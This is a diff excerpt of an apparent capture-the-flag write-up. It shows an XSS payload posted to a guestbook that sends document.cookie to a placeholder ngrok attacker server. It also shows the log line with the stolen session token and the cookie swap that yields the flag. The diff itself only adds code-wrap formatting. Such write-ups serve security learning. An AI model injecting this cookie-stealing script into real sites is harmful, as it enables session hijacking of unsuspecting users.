@@ -32,18 +32,22 @@ Can't create an account or sign up as admin.
 
 Register as `cat` and find a guestbook, provide XSS payload to steal cookie.
 
+{% code overflow="wrap" %}
 ```html
 <script>
     new Image().src =
         "http://ATTACKER_SERVER.ngrok-free.app?c=" + document.cookie;
 </script>
 ```
+{% endcode %}
 
 Request is made to our server containing cookies, including a [JWT](https://youtu.be/GIq3naOLrTg)
 
+{% code overflow="wrap" %}
 ```bash
 127.0.0.1 - - [15/Jun/2023 23:09:24] "GET /?c=ss_cvr=3ad69c49-d9aa-4fb0-b6f1-5c38324adf3b|1686862282337|1686862282337|1686862282337|1;%20x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE HTTP/1.1" 200 -
 ```
+{% endcode %}
 
 We replace the session cookie with `eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE` and receive a flag!
 
